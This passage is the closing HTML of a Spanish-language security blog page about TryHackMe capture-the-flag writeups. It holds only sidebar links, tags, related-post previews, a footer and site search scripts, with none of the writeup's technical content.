Celedon&url=https://rjceledon.github.io/posts/blog-thm-writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar link" title-succeed="Link copiado satisfactoriamente!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado Recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/the-marketplace-thm-writeup/">The Marketplace - THM Writeup</a><li><a href="/posts/brainpan-thm-writeup/">Brainpan 1 - THM Writeup</a><li><a href="/posts/blog-thm-writeup/">Blog - THM Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenidos</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Seguir Leyendo</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/the-marketplace-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-07 22:55:30 +0000" > 7 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>The Marketplace - THM Writeup</h3><div class="text-muted small"><p> En el campo de la ciberseguridad, el realizar las pruebas en competencias del tipo Captura la bandera o CTF nos ayuda a comprender los conceptos claves sobre aquellas vulnerabilidades que pudiese...</p></div></div></a></div><div class="card"> <a href="/posts/brainpan-thm-writeup/"><div class="card-body"> <em class="timeago small" date="2022-01-12 14:22:30 +0000" >12 Jan, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Brainpan 1 - THM Writeup</h3><div class="text-muted small"><p> El dia de hoy se presenta una guia o writeup sobre una maquina interesante en la plataforma de TryHackMe la cual segun su propia descripcion indica que se hara un analisis de una vulnerabilidad p...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/brainpan-thm-writeup/" class="btn btn-outline-primary" prompt="Mas viejo"><p>Brainpan 1 - THM Writeup</p></a> <span class="btn btn-outline-primary disabled" prompt="Mas nuevo"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/">Rich J. Celedon</a>. <span data-toggle="tooltip" data-placement="top" title="Excepto cuando se señale lo contrario, los posts del blog de este sitio estan licenciados bajo Creative Commons Attribution 4.0 International (CC BY 4.0) Licenciado por el autor.">Ciertos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Tags Populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/thm/">thm</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/escape/">escape</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se hallaron resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
